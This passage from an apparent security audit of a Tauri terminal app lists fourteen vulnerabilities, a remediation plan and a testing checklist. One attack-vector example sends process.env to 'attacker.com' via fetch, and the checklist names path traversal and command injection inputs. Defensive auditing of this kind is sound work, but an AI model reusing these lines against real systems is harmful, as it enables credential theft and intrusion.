const command = Command.create('node', [entryPoint, port.toString()], {
  cwd: widgetPath,
  env: {
    PORT: port.toString(),
    WIDGET_ID: widgetId,
  },
})
```

**Issue:** While this only sets PORT and WIDGET_ID, the Tauri process may inherit parent process environment variables containing:
- API keys
- Database credentials
- Git tokens
- SSH keys (via SSH_AUTH_SOCK)
- AWS credentials
- OAuth tokens

**Attack Vector:**
1. Malicious widget calls `process.env` and logs all variables
2. Widget makes HTTP request with environment data: `fetch('http://attacker.com/?env=' + JSON.stringify(process.env))`
3. Other processes can be discovered and attacked if they inherit same environment

**Impact:**
- **Credential Exposure:** Widget accesses parent's environment variables
- **Lateral Attacks:** Uses credentials to attack other services
- **Information Disclosure:** Reveals system configuration

**Remediation:**
```typescript
// 1. Explicitly set ONLY required environment variables
const createWidgetEnvironment = (): Record<string, string> => {
  return {
    PORT: process.env.PORT || '3000',
    WIDGET_ID: widgetId,
    NODE_ENV: 'production',
    // Explicitly exclude: AWS_*, GIT_*, GITHUB_*, DATABASE_*, API_KEY, etc.
  };
};

// 2. Spawn with empty environment
const command = Command.create('node', [entryPoint, port.toString()], {
  cwd: widgetPath,
  env: createWidgetEnvironment(),
  // Use 'spawn' with 'stdio: 'inherit'' NOT inherited env
});
```

---

## Summary Table

| # | Severity | Title | File | Lines | CWE | Status |
|---|----------|-------|------|-------|-----|--------|
| 1 | CRITICAL | Command Injection in Git Operations | lib.rs | 316-379 | CWE-78 | Needs Fix |
| 2 | CRITICAL | Plaintext Credential Storage | mcp.ts | 82, 89, 102 | CWE-312 | Needs Fix |
| 3 | CRITICAL | Arbitrary JavaScript Execution in WebViews | lib.rs | 130-145 | CWE-95 | Needs Fix |
| 4 | CRITICAL | Unvalidated URL Loading in WebViews | WebViewPane.tsx | 185-207 | CWE-601 | Needs Fix |
| 5 | HIGH | XSS via dangerouslySetInnerHTML | EditorPane.tsx | 510, 547 | CWE-79 | Needs Fix |
| 6 | HIGH | Widget Process Unrestricted Capabilities | WidgetProcessManager.ts | 68-74 | CWE-648 | Needs Fix |
| 7 | HIGH | MCP Tool Execution Without Validation | mcpClient.ts | 196-202 | CWE-94 | Needs Fix |
| 8 | HIGH | Widget Storage Uses localStorage | WidgetHost.tsx | 197-208 | CWE-312 | Needs Fix |
| 9 | MEDIUM | File System Operations Without Validation | lib.rs | 384-410 | CWE-22 | Needs Fix |
| 10 | MEDIUM | Unvalidated Env Vars in MCP Configs | mcp.ts | 65-117 | CWE-15 | Needs Fix |
| 11 | MEDIUM | Content Security Policy Too Permissive | tauri.conf.json | 28 | CWE-693 | Needs Fix |
| 12 | MEDIUM | Widget Discovery from User-Writable Dirs | WidgetDiscovery.ts | 122-128 | CWE-426 | Needs Fix |
| 13 | MEDIUM | Cross-Origin postMessage Without Validation | useElementSelector.ts | 169-172 | CWE-942 | Needs Fix |
| 14 | MEDIUM | Process Environment Variables Exposed | WidgetProcessManager.ts | 70-74 | CWE-200 | Needs Fix |

---

## Remediation Roadmap

### Phase 1: Critical (Week 1)
1. **Git Command Injection** - Add input validation functions (30 min)
2. **Credential Plaintext Storage** - Implement secure credential storage via Tauri (2 hours)
3. **WebView Script Execution** - Remove/restrict arbitrary script execution (1 hour)
4. **URL Validation** - Implement strict URL validation (1 hour)

### Phase 2: High (Week 2)
5. **XSS Sanitization** - Add DOMPurify to markdown/code rendering (1 hour)
6. **Widget Sandbox** - Implement environment restrictions (2 hours)
7. **MCP Tool Validation** - Add schema validation for tool arguments (2 hours)
8. **Widget Storage** - Migrate to Tauri secure storage (2 hours)

### Phase 3: Medium (Week 3)
9. **File System Validation** - Add path canonicalization checks (2 hours)
10. **CSP Hardening** - Update tauri.conf.json with stricter CSP (30 min)
11. **Widget Discovery** - Implement allowlist and signature verification (3 hours)
12. **Origin Validation** - Add origin checks to postMessage (1 hour)
13. **Environment Variables** - Clean environment for widget processes (1 hour)
14. **MCP Credentials** - Remove credential templates (30 min)

---

## Testing Recommendations

### Security Testing Checklist

- [ ] Command injection fuzzing with special characters: `..`, `$()`, backticks, etc.
- [ ] Path traversal testing: `../../../../etc/passwd`
- [ ] URL fuzzing: `javascript:`, `data:`, `file://`, protocol handlers
- [ ] XSS payload testing in markdown and code preview
- [ ] Widget process capability testing (can it fork processes, access filesystem?)
- [ ] Credential storage verification (use system tools to verify encryption)
- [ ] CSP bypass testing (try inline styles, external scripts)
- [ ] Widget discovery with malicious manifests
- [ ] postMessage origin spoofing attempts

### Automated Testing

```bash
# Add security-focused test suite
npm run test:security

# Use Snyk/OWASP Dependency Check
snyk test
npm audit fix
```

---

## References

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- CWE List: https://cwe.mitre.org/
- Tauri Security: https://tauri.app/en/docs/guides/security
- React Security: https://react.dev/learn/security
- Content Security Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

---

## Conclusion

The Infinitty hybrid terminal application requires immediate security improvements in critical areas of command execution, credential storage, and input validation. The current architecture exposes users to:

- **Arbitrary code execution** through git commands and webview scripts
- **Credential theft** via plaintext storage and XSS
- **Privilege escalation** through unrestricted widget execution
- **Data exfiltration** via relaxed CSP and unvalidated network access

Implementation of the recommended remediations will significantly improve the security posture and protect users from common exploitation vectors.

